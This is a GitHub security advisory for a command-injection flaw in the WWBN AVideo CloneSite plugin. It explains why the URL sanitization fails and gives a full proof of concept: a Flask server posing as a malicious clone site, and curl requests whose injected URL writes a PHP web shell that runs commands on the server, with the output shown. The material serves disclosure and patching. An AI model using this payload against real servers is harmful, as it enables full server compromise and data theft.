# [H] WWBN AVideo: RCE cause by clonesite plugin

## Summary
Severity: High
Advisory: GHSA-xr6f-h4x7-r6qp
CVE: CVE-2026-41304
CWE: CWE-77, CWE-78
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-xr6f-h4x7-r6qp
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
Description

## Summary

The `cloneServer.json.php` endpoint in the CloneSite plugin constructs shell commands using user-controlled input (`url` parameter) without proper sanitization. The input is directly concatenated into a `wget` command executed via `exec()`, allowing command injection.

An attacker can inject arbitrary shell commands by breaking out of the intended URL context using shell metacharacters (e.g., `;`). This leads to **Remote Code Execution (RCE)** on the server.

## Details

Inside `plugin/CloneSite/cloneClient.json.php`(line112) didn't have proper sanitization

```php
$objClone->cloneSiteURL = str_replace("'", '', escapeshellarg($objClone->cloneSiteURL));
```

use `str_replace ` make `'` added by `escapeshellarg` become ` ` so hacker can inject evil `cloneSiteURL` to rce

```php
$sqlURL = "{$objClone->cloneSiteURL}videos/clones/{$json->sqlFile}"; \\116
$cmd = "wget -O {$sqlFile} {$sqlURL}"; \\117
exec($cmd . " 2>&1", $output, $return_val);                 \\119
```

The attack flow

1. make a evil site to provide date

2. add  evil url in `objects/pluginAddDataObject.json.php` 

3. access `plugin/CloneSite/cloneClient.json.php` to trigger rce

   

## Poc

make a evil site use python like this 

```python
from flask import Flask, jsonify, request

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    print("PATH:", path)


    return jsonify({
            "error": False,
            "msg": "",
            "url": "http://target-site.com/",
            "key": "target_clone_key",
            "useRsync": 0,
            "videosDir": "/var/www/html/AVideo/videos/",
            "sqlFile": "Clone_mysqlDump_evil123.sql",
            "videoFiles": [],
            "photoFiles": []
        })



if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8071)
```

change url with payload like (need admin)

```shell
curl -b 'PHPSESSID=<admin_session>'
-X POST "http://127.0.0.1/objects/pluginAddDataObject.json.php" \
  -H "Content-Type: application/json" \
  -d '{
    "cloneSiteURL":"http://127.0.0.1:8071/;echo${IFS}\"<?=system(\\$_POST[1])?>\"${IFS}>1.php;/",
    "cloneSiteSSHIP":"127.0.0.1",
    "cloneSiteSSHUser":"1",
    "cloneSiteSSHPort":"22",
    "cloneSiteSSHPassword":{
        "type":"encrypted",
        "value":"cU1SVkhSVkxqMmxDZlUrSFhNZnRvcFBtTmI3UXNGZ0VFVWxlLzdJL0pjWGFiVXgyb2Iyci9OOE5LN0p6TmN6Zg=="
    },
    "useRsync":true,
    "MaintenanceMode":false,
    "myKey":"ba882541262f3202ee5a5ad790ae5b70"
}' 
#inject evil code
curl "http://127.0.0.1/plugin/CloneSite/cloneClient.json.php" #trigger rce to write 1.php
curl "http://127.0.0.1/plugin/CloneSite/1.php" 
 -d '1=id'
 #uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

this payload is to create a web shell 

then access `plugin/CloneSite/cloneClient.json.php` 

`1.php`will be created 

## impact

- **Remote Code Execution**: An attacker can write arbitrary PHP code to any writable web-accessible directory, achieving full server compromise.

- **Full server compromise**: With arbitrary PHP execution as the web server user, the attacker can read/modify the database, access all user data, pivot to other services, and potentially escalate privileges on the host.

## Recommended Fix

add more powerful sanitization for `$objClone->cloneSiteURL`

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-xr6f-h4x7-r6qp
- https://nvd.nist.gov/vuln/detail/CVE-2026-41304
- https://github.com/WWBN/AVideo/commit/473c609fc2defdea8b937b00e86ce88eba1f15bb
- https://github.com/WWBN/AVideo
